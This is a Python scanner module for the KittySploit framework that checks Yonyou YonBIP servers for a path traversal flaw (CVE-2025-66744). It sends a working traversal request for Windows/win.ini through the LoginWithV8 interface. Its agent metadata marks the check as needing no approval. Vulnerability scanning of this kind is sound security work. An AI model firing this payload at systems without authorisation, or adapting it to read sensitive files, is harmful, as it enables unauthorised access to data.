#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yonyou YonBIP v3 and before contains a path traversal caused by improper validation in the LoginWithV8 interfa."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yonyou YonBIP - Path Traversal Detection',
        'description': 'Yonyou YonBIP v3 and before contains a path traversal caused by improper validation in the LoginWithV8 interface of the series data application service system, letting unauthorized attackers access sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'yonbip', 'lfi', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-66744',
            'https://github.com/iSee857/YonYouBip-path-travel',
        ],
        'cve': 'CVE-2025-66744',
    }

    def run(self):
        path = '/bi/api/Portal/LoginWithV8/?ticket=/../../../../Windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('[fonts]', '[extensions]', 'Message',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Yonyou YonBIP - Path Traversal detected', path=path)
            return True
        return False

